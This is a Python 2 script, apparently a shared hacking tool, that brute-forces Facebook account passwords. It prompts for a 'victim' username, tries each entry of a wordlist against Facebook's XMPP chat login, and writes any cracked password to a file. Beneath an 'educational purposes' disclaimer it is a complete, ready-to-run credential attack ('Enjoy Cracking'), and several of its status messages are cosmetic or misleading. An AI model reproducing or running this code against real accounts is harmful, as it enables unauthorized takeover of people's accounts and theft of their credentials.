#!/usr/bin/python
 
#Install SleekXMPP & xmpppy Modules
#This program is not for children -(18)
#This program is only for educational purposes only.
#Don't Attack people facebook account's it's illegal ! 
#If you want to HaCk into someone's account, you must have the permission of the user. 
#usage:Facebook-brute-force.py [wordlist file]
#Coded By Hossam Youssef <hossam.mox@gmail.com> ^_^
 
import xmpp
import sys
import urllib,re
import time
import random
import datetime
 
def internet_on():
	try :
		data = urllib.urlopen('https://www.google.com')
		return True
	except :
		return False
		
if internet_on() == True:
	print """ 
	\t _____  _____            _____                     _                
	\t|  ___|| ___ \          /  __ \                   | |               
	\t| |_   | |_/ /  ______  | /  \/ _ __   __ _   ___ | | __  ___  _ __ 
	\t|  _|  | ___ \ |______| | |    | '__| / _` | / __|| |/ / / _ \| '__|
	\t| |    | |_/ /          | \__/\| |   | (_| || (__ |   < |  __/| |   
	\t\_|    \____/            \____/|_|    \__,_| \___||_|\_\ \___||_|   
																															  
		# Private Ghost Password ^_^
		# Coded By Hossam Youssef :)
		# Enjoy Cracking ^_^
		# usage: Facebook-brute-force.py [wordlist file]
															 
														"""     
	 
	 
	 
	 
	login = raw_input("Enter username of victim account : ")
	 
	 
	password_list   = open(sys.argv[1],"r")
	 
	_login=login+"@chat.facebook.com"
	 
	print "[+]Connecting To Facebook Terminal Server... "
	print "[+]Connection Has Been Establishing Successfully To The Server..."
	print "[+]Negotiating With The Protocol..."
	print "[+]There was no error with Port..."
	print "[+]You Are Successfully Connected Enj0y..."
	print "[+]Attack Has Been Started Be Patient..."
		 
	for pwd in password_list:
	 
		sys.stdout.write(".")
		sys.stdout.flush()
	 
		pwd=pwd.strip('\n')
	 
		jid = xmpp.protocol.JID(_login)
		cl  = xmpp.Client(jid.getDomain(), debug=[])
	 
		if cl.connect(('chat.facebook.com',5222)):
			print "!~Injecting Password~!"
			
		else:
			print "[+]Successed[+]"
	 
		print '[!]',pwd
	 
		if cl.auth(jid.getNode(), pwd):
			cl.sendInitPresence()
			print "[+] -> The Account Has Been Cracked ^__^ "," Password Found ==> : ",pwd
			file = open(login+".txt", "w")
			file.write("Email : " +login+ "@facebook.com\n")
			file.write("Password : " +pwd+ "\n")
			file.write(str(datetime.datetime.now()))
			file.close()
			break
	 
		cl.disconnect()
		time.sleep(2)
else:
	print "You have a problem to connect to the Internet :(" 